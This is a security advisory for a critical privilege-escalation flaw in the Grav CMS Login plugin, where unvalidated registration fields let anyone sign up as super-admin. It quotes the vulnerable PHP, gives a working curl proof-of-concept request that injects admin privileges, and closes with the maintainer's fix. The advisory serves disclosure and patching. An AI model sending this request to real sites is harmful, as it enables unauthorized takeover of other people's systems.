# [C] Grav Vulnerable to Privilege Escalation via Missing Server-Side Validation of groups/access

## Summary
Severity: Critical
Advisory: GHSA-pxm6-mhxr-q4mj
CVE: CVE-2026-42613
CWE: CWE-20
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-pxm6-mhxr-q4mj
Type: github-advisory

## Affected
- Packagist: `getgrav/grav` — affected >=0 <2.0.0-beta.2

## Details
# Bug Report: Registration Privilege Escalation via Missing Server-Side Validation of groups/access

## Summary

The `Login::register()` method in the Login plugin accepts attacker-controlled `groups` and `access` fields from the registration POST data without server-side validation. When registration is enabled and `groups` or `access` are included in the configured allowed fields list, an unauthenticated user can self-register with `admin.super` privileges by injecting these fields into the registration request.

This is a missing server-side validation issue — the only defense is a config-level `fields` allowlist, which is an admin-facing setting, not a hardcoded security boundary.

## Affected Component

- **File:** `user/plugins/login/classes/Login.php`, lines 246-306
- **Method:** `Login::register()`
- **Validation:** `Login::validateField()`, lines 363-432
- **Plugin:** Login Plugin 3.8.0
- **Grav:** 1.8.0-beta.29

## Root Cause

In `register()` (lines 254-267), the `groups` and `access` fields are only set to config defaults **if they are not already present in the input data**:

```php
// Line 254-260
if (!isset($data['groups'])) {
    $groups = (array) $this->config->get('plugins.login.user_registration.groups', []);
    if (count($groups) > 0) {
        $data['groups'] = $groups;
    }
}

// Line 262-267
if (!isset($data['access'])) {
    $access = (array) $this->config->get('plugins.login.user_registration.access.site', []);
    if (count($access) > 0) {
        $data['access']['site'] = $access;
    }
}
```

If an attacker **includes** `groups` or `access` in the POST body, the `!isset()` check passes and the config defaults are skipped. The attacker's values flow through unchanged.

Later (lines 298-303), these values are assigned directly to the user object:

```php
if (isset($data['groups'])) {
    $user->groups = $data['groups'];  // attacker-controlled
}
if (isset($data['access'])) {
    $user->access = $data['access'];  // attacker-controlled
}
$user->save();
```

The `validateField()` method (lines 363-432) has a `switch` statement that only validates: `username`, `password`, `password2`, `email`, `permissions`, `state`, and `language`. The `groups` and `access` fields pass through the `default` case with **no validation at all**.

## Precondition

Registration must be enabled with `groups` and/or `access` in the configured allowed fields:

```yaml
# user/config/plugins/login.yaml
user_registration:
  enabled: true
  fields:
    - username
    - password
    - email
    - fullname
    - groups    # ← enables the attack
    - access    # ← enables the attack
```

This is a configuration the admin UI allows without any warning. An admin adding `groups` to let users pick a non-privileged group (e.g., `editors`) unknowingly exposes the escalation path, since there is no validation constraining which groups can be selected.

## Proof of Concept

### Malicious registration request (unauthenticated):

```bash
curl -X POST "${TARGET}/user_register" \
  --data-urlencode "data[username]=attacker" \
  --data-urlencode "data[password1]=Str0ngP@ss!" \
  --data-urlencode "data[password2]=Str0ngP@ss!" \
  --data-urlencode "data[email]=attacker@evil.com" \
  --data-urlencode "data[fullname]=Attacker" \
  --data-urlencode "data[groups][]=admins" \
  --data-urlencode "data[access][admin][login]=true" \
  --data-urlencode "data[access][admin][super]=true" \
  --data-urlencode "data[access][site][login]=true" \
  --data-urlencode "form-nonce=${FORM_NONCE}" \
  --data-urlencode "__form-name__=user_register" \
  --data-urlencode "__unique_form_id__=${FORM_UID}"
```

### Resulting account file (`user/accounts/attacker.yaml`):

```yaml
email: attacker@evil.com
fullname: Attacker
groups:
  - admins
access:
  admin:
    login: true
    super: true
  site:
    login: true
hashed_password: ...
state: enabled
```

The attacker can then log into `/admin` with full super-admin privileges.

## Impact

- **Severity:** Critical (when precondition is met)
- **Vector:** Unauthenticated → Super Admin
- **Escalation:** Full admin panel access, which chains to RCE via known admin vectors https://github.com/getgrav/grav/security/advisories/GHSA-4fg4-8cr8-326m or Plugin Upload
- **Precondition:** Registration enabled with `groups` or `access` in allowed fields — a configuration the admin UI permits without warning


## Environment

- Grav Core: 1.8.0-beta.29
- Login Plugin: 3.8.0
- PHP: 8.4.11

## Credits

Jonathan Dersch at Hacking Cult GmbH https://hackingcult.de/



---

## Maintainer note — fix applied (2026-04-24)

Fixed in **grav-plugin-login 3.8.2** (commit [`3d419a0`](https://github.com/getgrav/grav-plugin-login/commit/3d419a0)). On the Grav 2.0 line, the login plugin is pinned at `>=3.8.2` by admin2's [`blueprints.yaml`](https://github.com/getgrav/grav-plugin-admin2/blob/develop/blueprints.yaml), so sites running admin2 with Grav **2.0.0-beta.2** pick the fix up automatically.

**What changed:** the registration form handler now explicitly skips the `groups` and `access` privilege fields in the per-field input loop — even if an administrator added them to `user_registration.fields`. A warning is logged on any attempted injection. Server-side `default_values`, invitations, and the `user_registration.{groups,access}` config remain the sole sources of those values.

**Files:**
- [`login.php`](https://github.com/getgrav/grav-plugin-login/blob/develop/login.php) — form handler privilege-field strip.

## References
- https://github.com/getgrav/grav/security/advisories/GHSA-pxm6-mhxr-q4mj
- https://github.com/getgrav/grav/security/advisories/GHSA-w48r-jppp-rcfw
- https://nvd.nist.gov/vuln/detail/CVE-2026-42613
- https://github.com/getgrav/grav-plugin-login/commit/3d419a0dabd70aed1fd49afcd5919004a4141da1
- https://github.com/getgrav/grav
